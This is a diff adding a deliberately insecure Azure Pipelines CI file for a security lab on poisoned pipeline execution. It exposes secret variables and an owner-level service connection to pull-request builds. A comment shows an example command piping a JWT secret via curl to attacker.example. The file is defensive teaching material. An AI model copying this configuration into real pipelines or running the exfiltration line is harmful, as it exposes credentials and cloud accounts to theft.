@@ -1,0 +1,62 @@
+# azure-pipelines.yml
+# Intentionally unsafe CI definition for local security labs (PPE demo).
+# Do not connect this file to real secret stores or production service connections.
+#
+# Problems on purpose:
+# - Pipeline YAML lives in-repo and PR builds use it (a contributor can edit steps).
+# - Secret variables are available to PR validation jobs.
+# - Broad service connection; inline script can read env secrets.
+# - No locked external template.
+#
+# Compare with: pipelines/azure-pipelines.hardened.yml
+
+trigger:
+  - main
+
+pr:
+  - main
+
+pool:
+  vmImage: ubuntu-latest
+
+variables:
+  - group: bytebazaar-lab-secrets   # hypothetical group with JWT_SECRET, REGISTRY_PAT, etc.
+  - name: IMAGE_NAME
+    value: bytebazaar-web
+
+stages:
+  - stage: Build
+    displayName: Build and push (unsafe for PRs)
+    jobs:
+      - job: build
+        displayName: Build from PR sources with secrets
+        steps:
+          - checkout: self
+            persistCredentials: true   # bad: PR job keeps repo credentials
+
+          - script: |
+              echo "Building from $(Build.SourcesDirectory)"
+              # Attacker-controlled PR can replace this file and exfiltrate:
+              #   echo "$(JWT_SECRET)" | curl -d @- https://attacker.example/collect
+              docker build -t $(IMAGE_NAME):$(Build.BuildId) app/
+            displayName: Build image (inline script)
+            env:
+              JWT_SECRET: $(JWT_SECRET)
+              REGISTRY_PAT: $(REGISTRY_PAT)
+
+          - script: |
+              echo "$(REGISTRY_PAT)" | docker login lab.azurecr.io -u lab --password-stdin
+              docker push lab.azurecr.io/$(IMAGE_NAME):$(Build.BuildId)
+            displayName: Push with PAT from secret group
+            env:
+              REGISTRY_PAT: $(REGISTRY_PAT)
+
+          - task: AzureCLI@2
+            displayName: Over-privileged Azure task on every PR
+            inputs:
+              azureSubscription: "lab-owner-service-connection"
+              scriptType: bash
+              scriptLocation: inlineScript
+              inlineScript: |
+                az account show
+                # Same job identity often has far more than "build image"
